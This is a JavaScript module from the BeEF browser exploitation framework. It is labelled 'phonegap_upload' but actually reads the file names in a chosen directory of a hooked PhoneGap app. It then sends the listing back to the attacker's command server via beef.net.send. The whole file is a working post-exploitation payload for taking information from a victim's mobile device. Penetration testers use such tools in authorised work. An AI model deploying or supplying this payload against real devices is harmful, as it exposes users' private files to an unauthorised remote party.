//
// Copyright (c) 2006-2015 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - http://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

// phonegap_upload
//
beef.execute(function() {
    var directory = "<%== @directory %>";
    var result = '';

    function fail() {
        result = 'fail';
        
        beef.net.send("<%= @command_url %>", <%= @command_id %>, 'result='+result );	
    }

    function success(entries) {
        var i;
        for (i=0; i<entries.length; i++) {
            result = result + '\n ' + entries[i].name;        
        }

        beef.net.send("<%= @command_url %>", <%= @command_id %>, 'result='+result );	
    } 

    // use directoryentry to create directory reader
    function gotDirEntry(dirEntry) {
        var directoryReader = dirEntry.createReader();
        directoryReader.readEntries(success,fail);
    }

    // use getDirectoy to create reference to directoryentry 
    function gotFS(fileSystem) {
        fileSystem.root.getDirectory(directory, null, gotDirEntry, fail);
    }
   
    window.requestFileSystem(LocalFileSystem.PERSISTENT, 0, gotFS, fail);

});
